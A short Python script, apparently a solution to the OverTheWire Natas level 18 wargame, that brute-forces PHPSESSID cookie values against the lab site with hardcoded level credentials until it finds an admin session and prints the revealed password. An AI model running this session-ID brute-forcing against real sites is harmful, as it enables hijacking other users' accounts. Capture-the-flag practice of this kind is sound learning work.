#! /usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

GREEN = "\033[92m"
YELLOW = "\033[93m"
ENDC = "\033[0m"

url = "http://natas18.natas.labs.overthewire.org/?debug=true"
auth = HTTPBasicAuth("natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
data = {"username":"admin","password":"A123a123"}
for i in range(1,641):
    cookies = {'PHPSESSID':str(i)}
    response = requests.post(url,data=data,auth=auth,cookies=cookies)
    soup = BeautifulSoup(response.text,"html.parser")
    output = soup.prettify()
    if("Password" in output):
        print(GREEN + "found :) session={}".format(i) + ENDC)
        print(str(soup.find('pre')).replace('<pre>','').replace('</pre>',''))
        break
    else:
        print(YELLOW + "trying {}".format(i) + ENDC)